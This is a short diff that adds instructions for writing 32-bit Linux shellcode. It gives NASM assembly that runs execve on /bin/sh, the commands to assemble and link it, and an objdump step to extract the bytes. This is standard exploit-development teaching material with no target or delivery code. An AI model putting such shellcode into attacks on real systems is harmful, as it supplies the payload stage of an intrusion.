@@ -1,0 +1,23 @@
+Assemble shellcode:
+```
+section .text
+global main
+main:
+    xor     eax, eax
+    xor     ecx, ecx
+    xor     edx, edx
+    push    0x0068732f; // /sh'\0'
+    push    0x6e69622f; // /bin
+    mov     ebx, esp
+    mov     al, 0xb
+    int     0x80
+```
+then compile with:
+```
+nasm -f elf32 shell.asm -o shell.o
+gcc -m32 shell.o -o shell
+```
+then disassemble to get shell code:
+```
+objdump -M intel -d shell
+```
